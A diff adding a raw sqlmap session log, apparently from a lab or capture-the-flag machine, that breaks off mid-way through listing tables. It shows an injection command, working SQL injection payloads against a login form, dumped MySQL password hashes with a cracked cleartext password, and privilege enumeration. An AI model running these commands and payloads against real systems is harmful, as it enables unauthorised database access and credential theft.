@@ -1,0 +1,994 @@
+└──╼ $sqlmap -a -u http://10.10.95.255/administrator.php --forms --dump-all
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.5.9#stable}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:58:14 /2022-01-01/
+
+[23:58:14] [INFO] testing connection to the target URL
+[23:58:15] [INFO] searching for forms
+[1/1] Form:
+POST http://10.10.95.255/administrator.php
+POST data: username=&password=
+do you want to test this form? [Y/n/q] 
+> Y
+Edit POST data [default: username=&password=] (Warning: blank fields detected): 
+do you want to fill blank fields with random values? [Y/n] 
+[23:58:37] [INFO] using '/home/hamza/.local/share/sqlmap/output/results-01012022_1158pm.csv' as the CSV results file in multiple targets mode
+[23:58:38] [INFO] checking if the target is protected by some kind of WAF/IPS
+[23:58:38] [INFO] testing if the target URL content is stable
+[23:58:39] [INFO] target URL content is stable
+[23:58:39] [INFO] testing if POST parameter 'username' is dynamic
+[23:58:40] [WARNING] POST parameter 'username' does not appear to be dynamic
+[23:58:40] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
+[23:58:40] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
+[23:58:40] [INFO] testing for SQL injection on POST parameter 'username'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
+[23:59:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[23:59:13] [WARNING] reflective value(s) found and filtering out
+[23:59:18] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[23:59:19] [INFO] testing 'Generic inline queries'
+[23:59:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[23:59:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[00:00:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[00:00:57] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[00:01:00] [INFO] POST parameter 'username' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --not-string="not")
+[00:01:00] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[00:01:00] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[00:01:00] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[00:01:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[00:01:01] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[00:01:02] [INFO] POST parameter 'username' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[00:01:02] [INFO] testing 'MySQL inline queries'
+[00:01:02] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[00:01:02] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[00:01:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[00:01:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[00:01:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[00:01:05] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[00:01:05] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[00:01:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[00:01:11] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[00:01:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[00:01:17] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[00:01:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[00:01:23] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+[00:01:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[00:01:34] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
+[00:01:39] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'
+[00:01:41] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'
+[00:01:42] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'
+[00:01:44] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query - comment)'
+[00:01:45] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[00:01:51] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
+[00:01:56] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[00:02:02] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
+[00:02:07] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[00:02:08] [INFO] testing 'MySQL OR time-based blind (ELT)'
+[00:02:13] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
+[00:02:13] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
+[00:02:19] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[00:02:19] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[00:02:20] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[00:02:20] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
+[00:02:20] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (heavy queries)'
+[00:02:20] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
+[00:02:20] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
+[00:02:20] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
+[00:02:20] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
+[00:02:20] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
+[00:02:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[00:02:21] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[00:02:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[00:02:22] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[00:02:24] [INFO] target URL appears to have 2 columns in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] 
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
+[00:04:18] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[00:04:29] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[00:04:40] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[00:04:52] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[00:05:04] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[00:05:16] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[00:05:26] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[00:05:37] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[00:05:53] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[00:06:05] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 404 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=SNDx' RLIKE (SELECT (CASE WHEN (1461=1461) THEN 0x534e4478 ELSE 0x28 END))-- TEfw&password=
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: username=SNDx' AND GTID_SUBSET(CONCAT(0x71766b6b71,(SELECT (ELT(9358=9358,1))),0x71717a7871),9358)-- okLQ&password=
+---
+do you want to exploit this SQL injection? [Y/n] 
+[00:07:20] [INFO] the back-end DBMS is MySQL
+[00:07:20] [INFO] fetching banner
+[00:07:21] [INFO] retrieved: '5.7.28-0ubuntu0.16.04.2'
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: MySQL >= 5.6
+banner: '5.7.28-0ubuntu0.16.04.2'
+[00:07:24] [INFO] fetching current user
+[00:07:24] [INFO] retrieved: 'root@localhost'
+current user: 'root@localhost'
+[00:07:24] [INFO] fetching current database
+[00:07:25] [INFO] retrieved: 'users'
+current database: 'users'
+[00:07:25] [INFO] fetching server hostname
+[00:07:25] [INFO] retrieved: 'ubuntu'
+hostname: 'ubuntu'
+[00:07:25] [INFO] testing if current user is DBA
+[00:07:25] [INFO] fetching current user
+current user is DBA: True
+[00:07:25] [INFO] fetching database users
+[00:07:26] [INFO] retrieved: ''root'@'localhost''
+[00:07:27] [INFO] retrieved: ''root'@'localhost''
+[00:07:27] [INFO] retrieved: ''root'@'localhost''
+[00:07:28] [INFO] retrieved: ''root'@'localhost''
+[00:07:29] [INFO] retrieved: ''root'@'localhost''
+[00:07:29] [INFO] retrieved: ''root'@'localhost''
+[00:07:30] [INFO] retrieved: ''root'@'localhost''
+[00:07:30] [INFO] retrieved: ''root'@'localhost''
+[00:07:31] [INFO] retrieved: ''root'@'localhost''
+[00:07:31] [INFO] retrieved: ''root'@'localhost''
+[00:07:32] [INFO] retrieved: ''root'@'localhost''
+[00:07:33] [INFO] retrieved: ''root'@'localhost''
+[00:07:33] [INFO] retrieved: ''root'@'localhost''
+[00:07:33] [INFO] retrieved: ''root'@'localhost''
+[00:07:34] [INFO] retrieved: ''root'@'localhost''
+[00:07:34] [INFO] retrieved: ''root'@'localhost''
+[00:07:35] [INFO] retrieved: ''root'@'localhost''
+[00:07:35] [INFO] retrieved: ''root'@'localhost''
+[00:07:36] [INFO] retrieved: ''root'@'localhost''
+[00:07:37] [INFO] retrieved: ''root'@'localhost''
+[00:07:37] [INFO] retrieved: ''root'@'localhost''
+[00:07:38] [INFO] retrieved: ''root'@'localhost''
+[00:07:38] [INFO] retrieved: ''root'@'localhost''
+[00:07:38] [INFO] retrieved: ''root'@'localhost''
+[00:07:39] [INFO] retrieved: ''root'@'localhost''
+[00:07:40] [INFO] retrieved: ''root'@'localhost''
+[00:07:40] [INFO] retrieved: ''root'@'localhost''
+[00:07:41] [INFO] retrieved: ''root'@'localhost''
+[00:07:42] [INFO] retrieved: ''mysql.session'@'localhost''
+[00:07:42] [INFO] retrieved: ''mysql.sys'@'localhost''
+[00:07:43] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:43] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:43] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:44] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:44] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:45] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:45] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:46] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:47] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:47] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:48] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:48] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:49] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:50] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:50] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:51] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:52] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:53] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:53] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:54] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:54] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:55] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:55] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:56] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:57] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:07:57] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:08:00] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+[00:08:01] [INFO] retrieved: ''debian-sys-maint'@'localhost''
+database management system users [4]:
+[*] 'debian-sys-maint'@'localhost'
+[*] 'mysql.session'@'localhost'
+[*] 'mysql.sys'@'localhost'
+[*] 'root'@'localhost'
+
+[00:08:01] [INFO] fetching database users password hashes
+[00:08:02] [INFO] retrieved: 'debian-sys-maint'
+[00:08:02] [INFO] retrieved: '*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B'
+[00:08:03] [INFO] retrieved: 'mysql.session'
+[00:08:03] [INFO] retrieved: '*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE'
+[00:08:04] [INFO] retrieved: 'mysql.sys'
+[00:08:04] [INFO] retrieved: '*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE'
+[00:08:04] [INFO] retrieved: 'root'
+[00:08:05] [INFO] retrieved: '*82D1BDA2F1E16E0DAEE2412F1C6E8DE7DF8B84FD'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
+do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] 
+[00:08:22] [INFO] using hash method 'mysql_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[00:08:33] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] 
+[00:08:39] [INFO] starting dictionary-based cracking (mysql_passwd)
+[00:08:39] [INFO] starting 4 processes 
+[00:08:50] [INFO] cracked password 'root' for user 'debian-sys-maint'                                                                                
+[00:08:52] [INFO] cracked password 'root' for user 'debian-sys-maint'                                                                                
+database management system users password hashes:                                                                                                    
+[*] debian-sys-maint [1]:
+    password hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
+    clear-text password: root
+[*] mysql.session [1]:
+    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+[*] mysql.sys [1]:
+    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+[*] root [1]:
+    password hash: *82D1BDA2F1E16E0DAEE2412F1C6E8DE7DF8B84FD
+
+[00:08:54] [INFO] fetching database users privileges
+[00:08:55] [INFO] retrieved: 'SELECT'
+[00:08:56] [INFO] retrieved: 'INSERT'
+[00:08:56] [INFO] retrieved: 'UPDATE'
+[00:08:57] [INFO] retrieved: 'DELETE'
+[00:08:57] [INFO] retrieved: 'CREATE'
+[00:08:58] [INFO] retrieved: 'DROP'
+[00:08:58] [INFO] retrieved: 'RELOAD'
+[00:08:59] [INFO] retrieved: 'SHUTDOWN'
+[00:08:59] [INFO] retrieved: 'PROCESS'
+[00:09:00] [INFO] retrieved: 'FILE'
+[00:09:00] [INFO] retrieved: 'REFERENCES'
+[00:09:00] [INFO] retrieved: 'INDEX'
+[00:09:01] [INFO] retrieved: 'ALTER'
+[00:09:01] [INFO] retrieved: 'SHOW DATABASES'
+[00:09:02] [INFO] retrieved: 'SUPER'
+[00:09:03] [INFO] retrieved: 'CREATE TEMPORARY TABLES'
+[00:09:04] [INFO] retrieved: 'LOCK TABLES'
+[00:09:04] [INFO] retrieved: 'EXECUTE'
+[00:09:05] [INFO] retrieved: 'REPLICATION SLAVE'
+[00:09:05] [INFO] retrieved: 'REPLICATION CLIENT'
+[00:09:06] [INFO] retrieved: 'CREATE VIEW'
+[00:09:06] [INFO] retrieved: 'SHOW VIEW'
+[00:09:07] [INFO] retrieved: 'CREATE ROUTINE'
+[00:09:08] [INFO] retrieved: 'ALTER ROUTINE'
+[00:09:08] [INFO] retrieved: 'CREATE USER'
+[00:09:09] [INFO] retrieved: 'EVENT'
+[00:09:09] [INFO] retrieved: 'TRIGGER'
+[00:09:10] [INFO] retrieved: 'CREATE TABLESPACE'
+[00:09:10] [INFO] retrieved: 'SUPER'
+[00:09:11] [INFO] retrieved: 'USAGE'
+[00:09:11] [INFO] retrieved: 'SELECT'
+[00:09:12] [INFO] retrieved: 'INSERT'
+[00:09:12] [INFO] retrieved: 'UPDATE'
+[00:09:13] [INFO] retrieved: 'DELETE'
+[00:09:14] [INFO] retrieved: 'CREATE'
+[00:09:14] [INFO] retrieved: 'DROP'
+[00:09:15] [INFO] retrieved: 'RELOAD'
+[00:09:15] [INFO] retrieved: 'SHUTDOWN'
+[00:09:16] [INFO] retrieved: 'PROCESS'
+[00:09:16] [INFO] retrieved: 'FILE'
+[00:09:17] [INFO] retrieved: 'REFERENCES'
+[00:09:19] [INFO] retrieved: 'INDEX'
+[00:09:20] [INFO] retrieved: 'ALTER'
+[00:09:20] [INFO] retrieved: 'SHOW DATABASES'
+[00:09:20] [INFO] retrieved: 'SUPER'
+[00:09:21] [INFO] retrieved: 'CREATE TEMPORARY TABLES'
+[00:09:21] [INFO] retrieved: 'LOCK TABLES'
+[00:09:22] [INFO] retrieved: 'EXECUTE'
+[00:09:23] [INFO] retrieved: 'REPLICATION SLAVE'
+[00:09:23] [INFO] retrieved: 'REPLICATION CLIENT'
+[00:09:24] [INFO] retrieved: 'CREATE VIEW'
+[00:09:26] [INFO] retrieved: 'SHOW VIEW'
+[00:09:26] [INFO] retrieved: 'CREATE ROUTINE'
+[00:09:29] [INFO] retrieved: 'ALTER ROUTINE'
+[00:09:30] [INFO] retrieved: 'CREATE USER'
+[00:09:31] [INFO] retrieved: 'EVENT'
+[00:09:31] [INFO] retrieved: 'TRIGGER'
+[00:09:32] [INFO] retrieved: 'CREATE TABLESPACE'
+database management system users privileges:
+[*] 'debian-sys-maint'@'localhost' (administrator) [28]:
+    privilege: ALTER
+    privilege: ALTER ROUTINE
+    privilege: CREATE
+    privilege: CREATE ROUTINE
+    privilege: CREATE TABLESPACE
+    privilege: CREATE TEMPORARY TABLES
+    privilege: CREATE USER
+    privilege: CREATE VIEW
+    privilege: DELETE
+    privilege: DROP
+    privilege: EVENT
+    privilege: EXECUTE
+    privilege: FILE
+    privilege: INDEX
+    privilege: INSERT
+    privilege: LOCK TABLES
+    privilege: PROCESS
+    privilege: REFERENCES
+    privilege: RELOAD
+    privilege: REPLICATION CLIENT
+    privilege: REPLICATION SLAVE
+    privilege: SELECT
+    privilege: SHOW DATABASES
+    privilege: SHOW VIEW
+    privilege: SHUTDOWN
+    privilege: SUPER
+    privilege: TRIGGER
+    privilege: UPDATE
+[*] 'mysql.session'@'localhost' (administrator) [1]:
+    privilege: SUPER
+[*] 'mysql.sys'@'localhost' [1]:
+    privilege: USAGE
+[*] 'root'@'localhost' (administrator) [28]:
+    privilege: ALTER
+    privilege: ALTER ROUTINE
+    privilege: CREATE
+    privilege: CREATE ROUTINE
+    privilege: CREATE TABLESPACE
+    privilege: CREATE TEMPORARY TABLES
+    privilege: CREATE USER
+    privilege: CREATE VIEW
+    privilege: DELETE
+    privilege: DROP
+    privilege: EVENT
+    privilege: EXECUTE
+    privilege: FILE
+    privilege: INDEX
+    privilege: INSERT
+    privilege: LOCK TABLES
+    privilege: PROCESS
+    privilege: REFERENCES
+    privilege: RELOAD
+    privilege: REPLICATION CLIENT
+    privilege: REPLICATION SLAVE
+    privilege: SELECT
+    privilege: SHOW DATABASES
+    privilege: SHOW VIEW
+    privilege: SHUTDOWN
+    privilege: SUPER
+    privilege: TRIGGER
+    privilege: UPDATE
+
+[00:09:32] [WARNING] on MySQL the concept of roles does not exist. sqlmap will enumerate privileges instead
+[00:09:32] [INFO] fetching database users privileges
+database management system users roles:
+[*] 'debian-sys-maint'@'localhost' (administrator) [28]:
+    role: ALTER
+    role: ALTER ROUTINE
+    role: CREATE
+    role: CREATE ROUTINE
+    role: CREATE TABLESPACE
+    role: CREATE TEMPORARY TABLES
+    role: CREATE USER
+    role: CREATE VIEW
+    role: DELETE
+    role: DROP
+    role: EVENT
+    role: EXECUTE
+    role: FILE
+    role: INDEX
+    role: INSERT
+    role: LOCK TABLES
+    role: PROCESS
+    role: REFERENCES
+    role: RELOAD
+    role: REPLICATION CLIENT
+    role: REPLICATION SLAVE
+    role: SELECT
+    role: SHOW DATABASES
+    role: SHOW VIEW
+    role: SHUTDOWN
+    role: SUPER
+    role: TRIGGER
+    role: UPDATE
+[*] 'mysql.session'@'localhost' (administrator) [1]:
+    role: SUPER
+[*] 'mysql.sys'@'localhost' [1]:
+    role: USAGE
+[*] 'root'@'localhost' (administrator) [28]:
+    role: ALTER
+    role: ALTER ROUTINE
+    role: CREATE
+    role: CREATE ROUTINE
+    role: CREATE TABLESPACE
+    role: CREATE TEMPORARY TABLES
+    role: CREATE USER
+    role: CREATE VIEW
+    role: DELETE
+    role: DROP
+    role: EVENT
+    role: EXECUTE
+    role: FILE
+    role: INDEX
+    role: INSERT
+    role: LOCK TABLES
+    role: PROCESS
+    role: REFERENCES
+    role: RELOAD
+    role: REPLICATION CLIENT
+    role: REPLICATION SLAVE
+    role: SELECT
+    role: SHOW DATABASES
+    role: SHOW VIEW
+    role: SHUTDOWN
+    role: SUPER
+    role: TRIGGER
+    role: UPDATE
+
+[00:09:32] [INFO] sqlmap will dump entries of all tables from all databases now
+[00:09:32] [INFO] fetching database names
+[00:09:33] [INFO] retrieved: 'information_schema'
+[00:09:34] [INFO] retrieved: 'mysql'
+[00:09:35] [INFO] retrieved: 'performance_schema'
+[00:09:35] [INFO] retrieved: 'sys'
+[00:09:35] [INFO] retrieved: 'users'
+[00:09:36] [INFO] fetching tables for databases: 'information_schema, mysql, performance_schema, sys, users'
+[00:09:37] [INFO] retrieved: 'information_schema'
+[00:09:37] [INFO] retrieved: 'CHARACTER_SETS'
+[00:09:38] [INFO] retrieved: 'information_schema'
+[00:09:38] [INFO] retrieved: 'COLLATIONS'
+[00:09:39] [INFO] retrieved: 'information_schema'
+[00:09:39] [INFO] retrieved: 'COLLATION_CHARACTER_SET_APPLICABILITY'
+[00:09:40] [INFO] retrieved: 'information_schema'
+[00:09:40] [INFO] retrieved: 'COLUMNS'
+[00:09:46] [INFO] retrieved: 'information_schema'
+[00:09:46] [INFO] retrieved: 'COLUMN_PRIVILEGES'
+[00:09:47] [INFO] retrieved: 'information_schema'
+[00:09:47] [INFO] retrieved: 'ENGINES'
+[00:09:48] [INFO] retrieved: 'information_schema'
+[00:09:48] [INFO] retrieved: 'EVENTS'
+[00:09:50] [INFO] retrieved: 'information_schema'
+[00:09:50] [INFO] retrieved: 'FILES'
+[00:09:51] [INFO] retrieved: 'information_schema'
+[00:09:51] [INFO] retrieved: 'GLOBAL_STATUS'
+[00:09:52] [INFO] retrieved: 'information_schema'
+[00:09:52] [INFO] retrieved: 'GLOBAL_VARIABLES'
+[00:09:53] [INFO] retrieved: 'information_schema'
+[00:09:53] [INFO] retrieved: 'KEY_COLUMN_USAGE'
+[00:09:53] [INFO] retrieved: 'information_schema'
+[00:09:54] [INFO] retrieved: 'OPTIMIZER_TRACE'
+[00:09:54] [INFO] retrieved: 'information_schema'
+[00:09:55] [INFO] retrieved: 'PARAMETERS'
+[00:09:55] [INFO] retrieved: 'information_schema'
+[00:09:56] [INFO] retrieved: 'PARTITIONS'
+[00:09:57] [INFO] retrieved: 'information_schema'
+[00:09:57] [INFO] retrieved: 'PLUGINS'
+[00:09:58] [INFO] retrieved: 'information_schema'
+[00:09:58] [INFO] retrieved: 'PROCESSLIST'
+[00:09:59] [INFO] retrieved: 'information_schema'
+[00:10:00] [INFO] retrieved: 'PROFILING'
+[00:10:00] [INFO] retrieved: 'information_schema'
+[00:10:01] [INFO] retrieved: 'REFERENTIAL_CONSTRAINTS'
+[00:10:01] [INFO] retrieved: 'information_schema'
+[00:10:01] [INFO] retrieved: 'ROUTINES'
+[00:10:02] [INFO] retrieved: 'information_schema'
+[00:10:02] [INFO] retrieved: 'SCHEMATA'
+[00:10:05] [INFO] retrieved: 'information_schema'
+[00:10:06] [INFO] retrieved: 'SCHEMA_PRIVILEGES'
+[00:10:06] [INFO] retrieved: 'information_schema'
+[00:10:07] [INFO] retrieved: 'SESSION_STATUS'
+[00:10:07] [INFO] retrieved: 'information_schema'
+[00:10:08] [INFO] retrieved: 'SESSION_VARIABLES'
+[00:10:08] [INFO] retrieved: 'information_schema'
+[00:10:09] [INFO] retrieved: 'STATISTICS'
+[00:10:10] [INFO] retrieved: 'information_schema'
+[00:10:10] [INFO] retrieved: 'TABLES'
+[00:10:11] [INFO] retrieved: 'information_schema'
+[00:10:12] [INFO] retrieved: 'TABLESPACES'
+[00:10:12] [INFO] retrieved: 'information_schema'
+[00:10:13] [INFO] retrieved: 'TABLE_CONSTRAINTS'
+[00:10:13] [INFO] retrieved: 'information_schema'
+[00:10:14] [INFO] retrieved: 'TABLE_PRIVILEGES'
+[00:10:14] [INFO] retrieved: 'information_schema'
+[00:10:15] [INFO] retrieved: 'TRIGGERS'
+[00:10:15] [INFO] retrieved: 'information_schema'
+[00:10:17] [INFO] retrieved: 'USER_PRIVILEGES'
+[00:10:17] [INFO] retrieved: 'information_schema'
+[00:10:18] [INFO] retrieved: 'VIEWS'
+[00:10:19] [INFO] retrieved: 'information_schema'
+[00:10:19] [INFO] retrieved: 'INNODB_LOCKS'
+[00:10:19] [INFO] retrieved: 'information_schema'
+[00:10:20] [INFO] retrieved: 'INNODB_TRX'
+[00:10:21] [INFO] retrieved: 'information_schema'
+[00:10:23] [INFO] retrieved: 'INNODB_SYS_DATAFILES'
+[00:10:23] [INFO] retrieved: 'information_schema'
+[00:10:24] [INFO] retrieved: 'INNODB_FT_CONFIG'
+[00:10:25] [INFO] retrieved: 'information_schema'
+[00:10:25] [INFO] retrieved: 'INNODB_SYS_VIRTUAL'
+[00:10:26] [INFO] retrieved: 'information_schema'
+[00:10:26] [INFO] retrieved: 'INNODB_CMP'
+[00:10:30] [INFO] retrieved: 'information_schema'
+[00:10:32] [INFO] retrieved: 'INNODB_FT_BEING_DELETED'
+[00:10:33] [INFO] retrieved: 'information_schema'
+[00:10:33] [INFO] retrieved: 'INNODB_CMP_RESET'
+[00:10:34] [INFO] retrieved: 'information_schema'
+[00:10:34] [INFO] retrieved: 'INNODB_CMP_PER_INDEX'
+[00:10:35] [INFO] retrieved: 'information_schema'
+[00:10:35] [INFO] retrieved: 'INNODB_CMPMEM_RESET'
+[00:10:36] [INFO] retrieved: 'information_schema'
+[00:10:36] [INFO] retrieved: 'INNODB_FT_DELETED'
+[00:10:37] [INFO] retrieved: 'information_schema'
+[00:10:38] [INFO] retrieved: 'INNODB_BUFFER_PAGE_LRU'
+[00:10:38] [INFO] retrieved: 'information_schema'
+[00:10:39] [INFO] retrieved: 'INNODB_LOCK_WAITS'
+[00:10:40] [INFO] retrieved: 'information_schema'
+[00:10:40] [INFO] retrieved: 'INNODB_TEMP_TABLE_INFO'
+[00:10:41] [INFO] retrieved: 'information_schema'
+[00:10:42] [INFO] retrieved: 'INNODB_SYS_INDEXES'
+[00:10:42] [INFO] retrieved: 'information_schema'
+[00:10:43] [INFO] retrieved: 'INNODB_SYS_TABLES'
+[00:10:43] [INFO] retrieved: 'information_schema'
+[00:10:44] [INFO] retrieved: 'INNODB_SYS_FIELDS'
+[00:10:44] [INFO] retrieved: 'information_schema'
+[00:10:45] [INFO] retrieved: 'INNODB_CMP_PER_INDEX_RESET'
+[00:10:45] [INFO] retrieved: 'information_schema'
+[00:10:46] [INFO] retrieved: 'INNODB_BUFFER_PAGE'
+[00:10:46] [INFO] retrieved: 'information_schema'
+[00:10:47] [INFO] retrieved: 'INNODB_FT_DEFAULT_STOPWORD'
+[00:10:47] [INFO] retrieved: 'information_schema'
+[00:10:48] [INFO] retrieved: 'INNODB_FT_INDEX_TABLE'
+[00:10:48] [INFO] retrieved: 'information_schema'
+[00:10:50] [INFO] retrieved: 'INNODB_FT_INDEX_CACHE'
+[00:10:50] [INFO] retrieved: 'information_schema'
+[00:10:51] [INFO] retrieved: 'INNODB_SYS_TABLESPACES'
+[00:10:51] [INFO] retrieved: 'information_schema'
+[00:10:52] [INFO] retrieved: 'INNODB_METRICS'
+[00:10:52] [INFO] retrieved: 'information_schema'
